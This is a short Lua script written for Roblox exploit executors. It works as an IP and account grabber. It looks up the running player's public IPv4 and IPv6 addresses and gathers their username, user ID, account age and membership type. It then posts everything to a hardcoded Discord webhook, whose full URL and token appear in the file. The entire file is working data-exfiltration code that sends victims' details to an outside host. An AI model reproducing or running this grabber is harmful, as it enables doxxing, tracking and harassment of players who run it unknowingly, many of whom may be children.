
local Webhook = "https://discord.com/api/webhooks/1090334868635910245/iFTdBxsR2ued4LFm1gLpBRwzH_5W3GGvTAkb7FHS728p6039_pSqIkmNxlM4AWmrPz5t" -- Put your Webhook link here

local IPv4 = game:HttpGet("https://v4.ident.me/")
local IPv6 = game:HttpGet("https://v6.ident.me/")

local Headers = {["content-type"] = "application/json"} -- Don't Modify

local LocalPlayer = game:GetService("Players").LocalPlayer

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = game.Players.LocalPlayer.Name

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "**Username**:",
           ["description"] = PlayerName,
           ["color"] = tonumber(0x2B6BE4),
           ["fields"] = {
               {
                   ["name"] = "MembershipType:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "AccountAge:",
                   ["value"] = AccountAge,
                   ["inline"] = true
},
               {
                   ["name"] = "UserId:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv4:",
                   ["value"] = IPv4,
                   ["inline"] = true
},
               {
                   ["name"] = "IPv6:",
                   ["value"] = IPv6,
                   ["inline"] = true
},
           },
       }}
   }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
   HttpRequest = syn.request
   else
   HttpRequest = http_request
end

HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
